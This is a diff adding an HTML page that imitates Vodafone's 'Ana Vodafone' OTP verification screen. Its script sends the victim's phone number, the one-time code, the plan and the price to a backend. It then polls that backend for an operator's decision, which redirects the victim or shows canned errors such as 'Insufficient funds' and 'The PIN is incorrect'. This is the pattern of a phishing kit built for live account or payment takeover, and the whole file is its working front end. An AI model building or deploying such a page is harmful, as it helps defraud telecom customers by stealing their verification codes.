@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Ana Vodafone - OTP</title>
+<style>
+  :root{
+    --vf-red:#e60000;
+    --bg:#f2f0f0;
+    --text-dark:#1a1a1a;
+    --text-grey:#6b6b6b;
+    --card-white:#ffffff;
+  }
+  *{box-sizing:border-box;}
+  html,body{
+    height:100%;
+    margin:0;
+    padding-top:env(safe-area-inset-top,0px);
+    padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:var(--bg);
+    display:flex;
+    justify-content:center;
+  }
+  .phone{
+    width:100%;
+    max-width:430px;
+    min-height:100vh;
+    min-height:100dvh;
+    display:flex;
+    flex-direction:column;
+    position:relative;
+  }
+
+  /* ripple hero */
+  .hero{
+    position:relative;
+    padding:70px 24px 28px;
+    overflow:hidden;
+  }
+  .ripples{
+    position:absolute;
+    top:50%;
+    left:50%;
+    width:900px;
+    height:900px;
+    transform:translate(-50%,-58%);
+    z-index:0;
+    pointer-events:none;
+  }
+  .ripples svg{width:100%;height:100%;}
+
+  .back-btn{
+    position:relative;
+    z-index:2;
+    width:42px;
+    height:42px;
+    border-radius:50%;
+    background:var(--card-white);
+    border:none;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    box-shadow:0 1px 4px rgba(0,0,0,.08);
+    cursor:pointer;
+    margin-bottom:34px;
+  }
+
+  .vf-logo{
+    position:relative;
+    z-index:2;
+    display:flex;
+    justify-content:center;
+    margin-bottom:22px;
+  }
+
+  .hero h1{
+    position:relative;
+    z-index:2;
+    text-align:center;
+    font-size:25px;
+    font-weight:800;
+    color:var(--text-dark);
+    margin:0 0 10px;
+    letter-spacing:-0.2px;
+  }
+  .hero p.sub{
+    position:relative;
+    z-index:2;
+    text-align:center;
+    font-size:14.5px;
+    color:var(--text-grey);
+    margin:0;
+    line-height:1.5;
+    padding:0 10px;
+  }
+  .hero p.sub span{
+    color:var(--text-dark);
+    font-weight:600;
+  }
+
+  /* form */
+  .form-area{
+    padding:10px 24px 0;
+  }
+
+  .otp-row{
+    display:flex;
+    justify-content:space-between;
+    gap:10px;
+    margin-bottom:18px;
+  }
+  .otp-box{
+    width:46px;
+    height:56px;
+    border-radius:14px;
+    background:var(--card-white);
+    box-shadow:0 1px 3px rgba(0,0,0,.04);
+    text-align:center;
+    font-size:22px;
+    font-weight:700;
+    color:var(--text-dark);
+    border:1.5px solid transparent;
+    outline:none;
+  }
+  .otp-box:focus{
+    border-color:var(--vf-red);
+  }
+
+  .resend-row{
+    text-align:center;
+    margin:4px 0 28px;
+    font-size:14.5px;
+    color:var(--text-grey);
+  }
+  .resend-row a{
+    color:var(--vf-red);
+    font-weight:600;
+    text-decoration:underline;
+    text-underline-offset:3px;
+  }
+  .resend-row .timer{
+    color:var(--text-dark);
+    font-weight:600;
+  }
+
+  .btn-verify{
+    width:100%;
+    border:none;
+    border-radius:16px;
+    background:#eb9898;
+    color:#fdeaea;
+    font-size:17px;
+    font-weight:600;
+    padding:17px 0;
+    cursor:not-allowed;
+  }
+  .btn-verify.enabled{
+    background:linear-gradient(180deg,#eb0000,#c40000);
+    color:#fff;
+    cursor:pointer;
+    box-shadow:0 4px 10px rgba(198,0,0,.25);
+  }
+
+  @media (prefers-color-scheme: dark){
+    :root:not([data-theme="light"]){
+      --bg:#1c1414;
+      --text-dark:#f2f2f2;
+      --text-grey:#b5aaaa;
+      --card-white:#2a2222;
+    }
+    .back-btn{background:#2a2222;}
+  }
+</style>
+</head>
+<body>
+  <div class="phone">
+
+    <div class="hero">
+      <div class="ripples">
+        <svg viewBox="0 0 900 900">
+          <g fill="none" stroke="var(--vf-red)" stroke-width="1">
+            <circle cx="450" cy="450" r="40" opacity="0.650"/>
+            <circle cx="450" cy="450" r="54" opacity="0.631"/>
+            <circle cx="450" cy="450" r="68" opacity="0.612"/>
+            <circle cx="450" cy="450" r="82" opacity="0.593"/>
+            <circle cx="450" cy="450" r="96" opacity="0.574"/>
+            <circle cx="450" cy="450" r="110" opacity="0.555"/>
+            <circle cx="450" cy="450" r="124" opacity="0.536"/>
+            <circle cx="450" cy="450" r="138" opacity="0.517"/>
+            <circle cx="450" cy="450" r="152" opacity="0.498"/>
+            <circle cx="450" cy="450" r="166" opacity="0.479"/>
+            <circle cx="450" cy="450" r="180" opacity="0.460"/>
+            <circle cx="450" cy="450" r="194" opacity="0.441"/>
+            <circle cx="450" cy="450" r="208" opacity="0.422"/>
+            <circle cx="450" cy="450" r="222" opacity="0.403"/>
+            <circle cx="450" cy="450" r="236" opacity="0.384"/>
+            <circle cx="450" cy="450" r="250" opacity="0.365"/>
+            <circle cx="450" cy="450" r="264" opacity="0.346"/>
+            <circle cx="450" cy="450" r="278" opacity="0.327"/>
+            <circle cx="450" cy="450" r="292" opacity="0.308"/>
+            <circle cx="450" cy="450" r="306" opacity="0.289"/>
+            <circle cx="450" cy="450" r="320" opacity="0.270"/>
+            <circle cx="450" cy="450" r="334" opacity="0.251"/>
+            <circle cx="450" cy="450" r="348" opacity="0.232"/>
+            <circle cx="450" cy="450" r="362" opacity="0.213"/>
+            <circle cx="450" cy="450" r="376" opacity="0.194"/>
+            <circle cx="450" cy="450" r="390" opacity="0.175"/>
+            <circle cx="450" cy="450" r="404" opacity="0.156"/>
+            <circle cx="450" cy="450" r="418" opacity="0.137"/>
+            <circle cx="450" cy="450" r="432" opacity="0.118"/>
+            <circle cx="450" cy="450" r="446" opacity="0.099"/>
+            <circle cx="450" cy="450" r="460" opacity="0.080"/>
+            <circle cx="450" cy="450" r="474" opacity="0.061"/>
+          </g>
+        </svg>
+      </div>
+
+      <button class="back-btn" aria-label="Back">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+
+      <div class="vf-logo">
+        <svg width="78" height="78" viewBox="0 0 100 100" fill="none" stroke="var(--vf-red)" stroke-width="5">
+          <path d="M55 15c-15 8-22 20-22 35 0 14 9 25 22 25 12 0 21-9 21-21 0-10-6-17-15-17-6 0-10 4-10 9 0 4 3 7 7 7" transform="translate(-4.5,5)"/>
+        </svg>
+      </div>
+
+      <h1>Verify your number</h1>
+      <p class="sub">Enter the 6-digit code sent to<br><span id="phoneNum">01022544474</span></p>
+    </div>
+
+    <div class="form-area">
+      <div class="otp-row">
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-index="0">
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-index="1">
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-index="2">
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-index="3">
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-index="4">
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-index="5">
+      </div>
+
+      <div class="resend-row">
+        Didn't receive the code? <span class="timer" id="timerText">Resend in 0:30</span>
+      </div>
+
+      <button class="btn-verify" id="verifyBtn">Verify</button>
+    </div>
+
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const phone = (params.get('phone') || '').trim();
+    const phoneNum = document.getElementById('phoneNum');
+
+    if (phoneNum) {
+      phoneNum.textContent = phone || '01022544474';
+    }
+
+    const boxes = Array.from(document.querySelectorAll('.otp-box'));
+    const verifyBtn = document.getElementById('verifyBtn');
+    const timerText = document.getElementById('timerText');
+    let pollTimer = null;
+
+    function checkComplete() {
+      const filled = boxes.every((box) => box.value.length === 1);
+      verifyBtn.disabled = !filled;
+      verifyBtn.classList.toggle('enabled', filled);
+      return filled;
+    }
+
+    boxes.forEach((box, index) => {
+      box.addEventListener('input', () => {
+        box.value = box.value.replace(/[^0-9]/g, '').slice(0, 1);
+        if (box.value && index < boxes.length - 1) {
+          boxes[index + 1].focus();
+        }
+        checkComplete();
+      });
+
+      box.addEventListener('keydown', (event) => {
+        if (event.key === 'Backspace' && !box.value && index > 0) {
+          boxes[index - 1].focus();
+        }
+      });
+
+      box.addEventListener('paste', (event) => {
+        event.preventDefault();
+        const digits = (event.clipboardData || window.clipboardData)
+          .getData('text')
+          .replace(/[^0-9]/g, '')
+          .slice(0, 6)
+          .split('');
+
+        digits.forEach((digit, digitIndex) => {
+          if (boxes[digitIndex]) boxes[digitIndex].value = digit;
+        });
+
+        const targetIndex = digits.length ? Math.min(digits.length - 1, boxes.length - 1) : 0;
+        boxes[targetIndex].focus();
+        checkComplete();
+      });
+    });
+
+    let seconds = 30;
+    let timerInterval = null;
+
+    function renderTimer() {
+      if (seconds <= 0) {
+        timerText.innerHTML = '<a href="#" id="resendTrigger">Resend code</a>';
+        const resendTrigger = document.getElementById('resendTrigger');
+        if (resendTrigger) {
+          resendTrigger.addEventListener('click', (event) => {
+            event.preventDefault();
+            seconds = 30;
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+              seconds -= 1;
+              if (seconds <= 0) {
+                clearInterval(timerInterval);
+                renderTimer();
+                return;
+              }
+              renderTimer();
+            }, 1000);
+            renderTimer();
+          });
+        }
+        return;
+      }
+
+      const minutes = Math.floor(seconds / 60);
+      const remainingSeconds = String(seconds % 60).padStart(2, '0');
+      timerText.textContent = `Resend in ${minutes}:${remainingSeconds}`;
+    }
+
+    timerInterval = setInterval(() => {
+      seconds -= 1;
+      if (seconds <= 0) {
+        clearInterval(timerInterval);
+        renderTimer();
+        return;
+      }
+      renderTimer();
+    }, 1000);
+
+    function pollApproval(id) {
+      if (pollTimer) clearInterval(pollTimer);
+      pollTimer = setInterval(async () => {
+        try {
+          const response = await fetch('http://localhost:3000/api/check-approval/' + id);
+          const data = await response.json();
+
+          if (data.status === 'approved') {
+            clearInterval(pollTimer);
+            const nextParams = new URLSearchParams(window.location.search);
+            nextParams.set('phone', phone || '01022544474');
+            window.location.href = 'mwish.html?' + nextParams.toString();
+          } else if (['denied', 'insufficient', 'demo_error'].includes(data.status)) {
+            clearInterval(pollTimer);
+            const message = data.status === 'denied'
+              ? 'The OTP is incorrect.'
+              : data.status === 'insufficient'
+                ? 'Insufficient funds.'
+                : 'The PIN is incorrect.';
+            alert(message);
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'Verify';
+          }
+        } catch (error) {
+          // Keep polling quietly if the server is temporarily unavailable.
+        }
+      }, 2500);
+    }
+
+    verifyBtn.addEventListener('click', async () => {
+      if (!checkComplete()) return;
+
+      const otp = boxes.map((box) => box.value).join('');
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Verifying...';
+
+      try {
+        const response = await fetch('http://localhost:3000/api/request-approval', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            plan: params.get('plan') || 'Ana Vodafone',
+            price: params.get('price') || '0',
+            phone: phone || '01022544474',
+            otp,
+            step: 'otp'
+          })
+        });
+
+        if (!response.ok) {
+          throw new Error('Request failed');
+        }
+
+        const data = await response.json();
+        pollApproval(data.id);
+      } catch (error) {
+        verifyBtn.disabled = false;
+        verifyBtn.textContent = 'Verify';
+        alert('Unable to connect to the server. Please try again.');
+      }
+    });
+
+    verifyBtn.disabled = true;
+    verifyBtn.classList.remove('enabled');
+    renderTimer();
+    checkComplete();
+  </script>
+</body>
+</html>
